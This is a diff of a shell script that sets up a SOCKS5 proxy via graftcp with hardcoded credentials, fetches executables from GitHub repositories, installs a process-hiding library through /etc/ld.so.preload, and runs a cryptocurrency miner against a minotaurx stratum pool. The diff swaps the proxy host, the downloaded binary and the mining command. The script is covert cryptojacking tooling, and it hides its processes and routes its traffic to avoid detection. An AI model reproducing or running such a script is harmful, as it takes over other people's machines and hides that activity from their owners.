@@ -11,7 +11,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = us-east-static-07.quotaguard.com:1080
+socks5 = 54.84.138.60:1080
 socks5_username = ezhuli9bodai52
 socks5_password = ojwdtv0fb80i6rudtkp4whn1f2cnr
 END
@@ -35,8 +35,8 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah
-chmod +x lah
+./graftcp/graftcp wget https://github.com/kilosri/ew/raw/main/gasken
+chmod +x gasken
 
 ./graftcp/graftcp wget https://github.com/kiposnakursi/a/raw/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/ http://pool.pktpool.io/
+./graftcp/graftcp ./gasken -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RDuJgKwVgh1MAQoQPCKLKyZvQ36wFGCnEd.gupron -x socks5://ezhuli9bodai52:ojwdtv0fb80i6rudtkp4whn1f2cnr@54.84.138.60:1080
